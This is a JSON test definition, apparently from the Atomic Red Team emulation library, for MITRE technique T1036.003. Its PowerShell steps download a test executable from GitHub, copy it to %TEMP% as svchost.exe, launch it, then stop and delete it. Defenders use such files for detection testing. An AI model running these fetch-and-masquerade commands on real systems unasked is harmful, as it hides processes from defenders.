{
  "id": "bc15c13f-d121-4b1f-8c7d-28d95854d086",
  "name": "Masquerading - non-windows exe running as windows exe",
  "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "356b138e-3563-43ca-89d1-17f6e857a7ea",
      "type": "execute-command",
      "data": {
        "command": "copy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "27e76828-f1a8-47d0-a7d2-c4c303554da9",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "bc522458-ceff-45e3-bd49-1df88d7e42cf",
      "name": "Check dependency 1/1",
      "description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inputfile}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c924e08e-2d17-4bdc-a39f-6a3597dbd338",
      "name": "Resolve dependency 1/1",
      "description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{inputfile}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe\" -OutFile \"#{inputfile}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6a2d63ba-873f-421b-b66a-468365a7722f",
      "name": "Re-check dependency 1/1",
      "description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inputfile}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "356b138e-3563-43ca-89d1-17f6e857a7ea",
      "p": "on-success",
      "o": "27e76828-f1a8-47d0-a7d2-c4c303554da9"
    },
    {
      "s": "356b138e-3563-43ca-89d1-17f6e857a7ea",
      "p": "on-failure",
      "o": "27e76828-f1a8-47d0-a7d2-c4c303554da9"
    },
    {
      "s": "bc522458-ceff-45e3-bd49-1df88d7e42cf",
      "p": "on-success",
      "o": "356b138e-3563-43ca-89d1-17f6e857a7ea"
    },
    {
      "s": "bc522458-ceff-45e3-bd49-1df88d7e42cf",
      "p": "on-failure",
      "o": "c924e08e-2d17-4bdc-a39f-6a3597dbd338"
    },
    {
      "s": "c924e08e-2d17-4bdc-a39f-6a3597dbd338",
      "p": "on-success",
      "o": "6a2d63ba-873f-421b-b66a-468365a7722f"
    },
    {
      "s": "6a2d63ba-873f-421b-b66a-468365a7722f",
      "p": "on-failure",
      "o": "356b138e-3563-43ca-89d1-17f6e857a7ea"
    }
  ],
  "tags": [
    "T1036.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "outputfile",
      "type": "path",
      "description": "path of file to execute",
      "value": "($env:TEMP + \"\\svchost.exe\")"
    },
    {
      "name": "inputfile",
      "type": "path",
      "description": "path of file to copy",
      "value": "PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe"
    }
  ]
}